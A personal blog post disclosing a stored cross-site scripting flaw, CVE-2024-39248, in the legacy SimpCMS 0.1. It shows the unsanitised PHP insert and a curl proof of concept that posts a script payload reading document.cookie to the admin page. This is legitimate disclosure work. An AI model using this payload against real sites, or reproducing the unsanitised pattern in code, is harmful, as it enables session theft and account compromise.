---
publishDate: 2024-10-21T00:00:00Z
author: Jason Jacobs
title: How I got my first CVE published — CVE-2024–39248
excerpt: It first started with a little exploration of a CMS software titled SimpCMS 0.1, which had its last release in October 2010 on SourceForge.
image: https://images.unsplash.com/photo-1570354181552-af3b38934470?auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D
category: Vulnerability Disclosure
tags:
  - cve
  - simp cms
metadata:
  canonical: https://jason-jacobs.dev/blog
---
# Discovering XSS in SimpCMS 0.1: A Legacy CMS Vulnerability Analysis

## Introduction
It first started with a little exploration of a CMS software titled SimpCMS 0.1, which had its last release in October 2010 on SourceForge. Given that this 14-year-old end-of-life (EOL) software already had two exploits published on ExploitDB, I decided to conduct a personal code review to discover any additional vulnerabilities.

## Initial Setup Challenges
Setting up the latest 14-year-old release proved challenging due to the code's use of deprecated PHP functions such as `mysql_connect`. While security best practices and OWASP recommendations existed even back then, they appeared to be overlooked in this implementation.

## Vulnerability Discovery
### Location
The vulnerability was found in the admin interface at the path `/admin.php?title=`

### Vulnerable Parameter
A parameter named `title` in the admin interface was discovered to be susceptible to XSS attacks, allowing execution of arbitrary web scripts or HTML through crafted payloads.

### Vulnerable Code Snippet
```php
if (isset($_POST['newSector']) && ($_POST['title'] != '' && ($_POST['abbrev'] != ''))) // New Sector has been submitted.
{
    $Db->insert(TABLE_PREFIX . "sectors");
    header('location: index.php?module=overview&sector=' . $Db->insert_id());
}
```

## Exploitation
The vulnerability can be exploited using a simple cURL command with an authenticated admin session cookie:

```bash
curl -X POST "http://site.com/SimpCMS/admin/index.php" \
     -d "title=<script>alert(document.cookie)</script>&abbrev=random&newSector=" \
     -b "PHPSESSID=COOKIEHERE"
```

## Additional Notes
- The software uses PureEdit 1.4.1 as its editor component, though this wasn't investigated further for this vulnerability report.
- Many legacy software applications still exist that no longer receive updates and use deprecated PHP versions (5.5 and earlier) along with outdated mysql functions.

## Publications and References
1. [PacketStorm Security](https://packetstormsecurity.com/files/179219/SimpCMS-0.1-Cross-Site-Scripting.html)
2. [CVE-2024-39248](https://www.cve.org/CVERecord?id=CVE-2024-39248)
3. [Vulners Database Entry](https://vulners.com/cve/CVE-2024-39248)
4. [GitHub PoC Repository](https://github.com/jasonthename/CVE-2024-39248)

## Conclusion
The discovery of this vulnerability highlights the importance of continued security research on legacy software. Even if applications are no longer maintained, identifying and documenting their vulnerabilities contributes to the security community's knowledge base.